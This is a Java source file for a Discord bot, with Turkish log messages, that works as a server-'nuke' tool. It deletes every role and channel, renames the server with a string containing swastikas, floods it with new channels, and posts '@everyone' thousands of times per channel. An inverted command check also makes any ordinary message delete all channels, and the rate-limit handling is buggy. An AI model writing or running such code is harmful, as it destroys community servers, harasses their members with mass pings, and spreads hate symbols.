package org.bot.event;

import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.entities.channel.middleman.GuildChannel;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.*;

public class DefaultEventListener extends ListenerAdapter {

    private final ExecutorService service = Executors.newFixedThreadPool(5);

    public Thread deleteAllChannels(Guild guild) {
        return new Thread(() -> {
            List<GuildChannel> allChannels = new ArrayList<>(guild.getChannels());
            List<CompletableFuture<Void>> deletionFutures = new ArrayList<>();

            for (GuildChannel guildChannel : allChannels) {
                // Silme işlemlerini Future olarak topla ve service'e gönder
                CompletableFuture<Void> future = guildChannel.delete().submit()
                        .thenAccept(aVoid -> System.out.println("Kanal '" + guildChannel.getName() + "' silindi!"))
                        .exceptionally(throwable -> {
                            System.err.println("Kanal '" + guildChannel.getName() + "' silinemedi: " + throwable.getMessage());
                            return null;
                        });
                deletionFutures.add(future);
            }

            try {
                CompletableFuture.allOf(deletionFutures.toArray(new CompletableFuture[0])).get();
            } catch (InterruptedException | ExecutionException e) {
                System.err.println("Kanalları silme işlemi sırasında bir hata oluştu: " + e.getMessage());
                Thread.currentThread().interrupt();
            }
        });
    }

    public Thread createChannels(Integer count, Guild guild, String name) {
        return new Thread(() -> {
            List<CompletableFuture<Void>> creationFutures = new ArrayList<>();
            for (int i = 0; i < count; i++) {
                CompletableFuture<Void> future = guild.createTextChannel(name).submit()
                        .thenAccept(channel -> System.out.println("Kanal '" + channel.getName() + "' oluşturuldu!"))
                        .exceptionally(throwable -> {
                            if (throwable.getCause() instanceof net.dv8tion.jda.api.exceptions.ErrorResponseException) {
                                net.dv8tion.jda.api.exceptions.ErrorResponseException ere = (net.dv8tion.jda.api.exceptions.ErrorResponseException) throwable.getCause();
                                if (ere.getErrorCode() == 429) {
                                    System.err.println("Kanal oluşturma sırasında Discord hız sınırına takıldı. Bekleniyor...");
                                    try {
                                        Thread.sleep(ere.getErrorCode() -50);
                                    } catch (InterruptedException ex) {
                                        Thread.currentThread().interrupt();
                                    }
                                }
                            }
                            System.err.println("Kanal oluşturulamadı: " + throwable.getMessage());
                            return null;
                        });
                creationFutures.add(future);
            }
            try {
                CompletableFuture.allOf(creationFutures.toArray(new CompletableFuture[0])).get();
            } catch (InterruptedException | ExecutionException e) {
                System.err.println("Kanalları oluşturma işlemi sırasında bir hata oluştu: " + e.getMessage());
                Thread.currentThread().interrupt();
            }
        });
    }

    public Thread tagEveryoneInAllChannels(Guild guild) {
        return new Thread(() -> {
            List<TextChannel> textChannels = new ArrayList<>(guild.getTextChannels());
            List<CompletableFuture<Void>> messageFutures = new ArrayList<>();

            for (TextChannel channel : textChannels) {
                if (guild.getTextChannelById(channel.getId()) == null) {
                    System.out.println("Kanal '" + channel.getName() + "' bulunamadı, mesaj gönderilmedi.");
                    continue;
                }

                for (int i = 0; i < 9999; i++) {
                    CompletableFuture<Void> future = channel.sendMessage("@everyone").submit()
                            .thenAccept(message -> System.out.println("Mesaj gönderildi: " + message.getContentRaw()))
                            .exceptionally(throwable -> {
                                if (throwable.getCause() instanceof net.dv8tion.jda.api.exceptions.ErrorResponseException) {
                                    net.dv8tion.jda.api.exceptions.ErrorResponseException ere = (net.dv8tion.jda.api.exceptions.ErrorResponseException) throwable.getCause();
                                    if (ere.getErrorCode() == 10003) {
                                        System.err.println("Mesaj gönderilemedi: Kanal '" + channel.getName() + "' bulunamadı (silinmiş olabilir).");
                                    } else if (ere.getErrorCode() == 429) {
                                        System.err.println("Mesaj gönderme sırasında Discord hız sınırına takıldı. Bekleniyor...");
                                        try {
                                            Thread.sleep(ere.getErrorCode() - 100);
                                        } catch (InterruptedException ex) {
                                            Thread.currentThread().interrupt();
                                        }
                                    } else {
                                        System.err.println("Mesaj gönderilemedi: " + throwable.getMessage());
                                    }
                                } else {
                                    System.err.println("Mesaj gönderilemedi: " + throwable.getMessage());
                                }
                                return null;
                            });
                    messageFutures.add(future);
                }
            }
            try {
                CompletableFuture.allOf(messageFutures.toArray(new CompletableFuture[0])).get();
            } catch (InterruptedException | ExecutionException e) {
                System.err.println("Mesaj gönderme işlemi sırasında bir hata oluştu: " + e.getMessage());
                Thread.currentThread().interrupt();
            }
        });
    }

    public void setGuildName(Guild guild, String name) {
        guild.getManager().setName(name).queue();
    }

    public Thread deleteAllRoles(Guild guild) {
        Runnable r = new Runnable() {
            @Override
            public void run() {
                List<Role> roles = guild.getRoles();
                for (Role r : roles) {
                    r.delete().queue();
                }
            }
        };
        return new Thread(r);
    }

    @Override
    public void onMessageReceived(@NotNull MessageReceivedEvent event) {
        if (event.getAuthor().isBot()) {
            return;
        }

        String messageContent = event.getMessage().getContentRaw();
        if (!messageContent.equalsIgnoreCase("!nuke")) {
            deleteAllChannels(event.getGuild()).start();
            return;
        }

        setGuildName(event.getGuild(), "卐ЖЫЩГЛ卍भ्रष्ट");

        if (event.getGuild() == null) {
            System.err.println("Komut DM'de kullanıldı veya sunucuya erişilemiyor.");
            return;
        }

        System.out.println("Nuke işlemi başlatılıyor...");

        Thread deleteAllThread = deleteAllChannels(event.getGuild());
        Thread createChannelsThread = createChannels(20, event.getGuild(), "卐ЖЫЩГЛ卍भ्रष्ट");
        Thread tagEveryoneThread = tagEveryoneInAllChannels(event.getGuild());
        Thread deleteAllRoles = deleteAllRoles(event.getGuild());

        try {
            deleteAllRoles.start();
            deleteAllRoles.join();

            System.out.println("Kanallar siliniyor...");
            deleteAllThread.start();
            deleteAllThread.join();

            System.out.println("Kanallar oluşturuluyor...");
            createChannelsThread.start();
            createChannelsThread.join();

            System.out.println("Herkese etiketleniyor...");
            tagEveryoneThread.start();
            tagEveryoneThread.join();

            System.out.println("Tüm işlemler tamamlandı.");
            event.getChannel().sendMessage("Nuke işlemi başarıyla tamamlandı!").queue();
        } catch (InterruptedException e) {
            System.err.println("Thread kesintiye uğradı: " + e.getMessage());
            Thread.currentThread().interrupt();
            event.getChannel().sendMessage("Nuke işlemi kesintiye uğradı!").queue();
        } catch (Exception e) {
            System.err.println("Nuke işlemi sırasında beklenmeyen bir hata oluştu: " + e.getMessage());
            event.getChannel().sendMessage("Nuke işlemi sırasında bir hata oluştu!").queue();
        }

        super.onMessageReceived(event);
    }

    public void shutdown() {
        if (!service.isShutdown()) {
            service.shutdown();
            try {
                if (!service.awaitTermination(60, TimeUnit.SECONDS)) {
                    service.shutdownNow();
                    System.err.println("ExecutorService görevleri zamanında tamamlayamadı, zorla kapatıldı.");
                }
            } catch (InterruptedException e) {
                service.shutdownNow();
                Thread.currentThread().interrupt();
                System.err.println("ExecutorService kapatılırken kesintiye uğradı.");
            }
            System.out.println("ExecutorService kapatıldı.");
        }
    }
}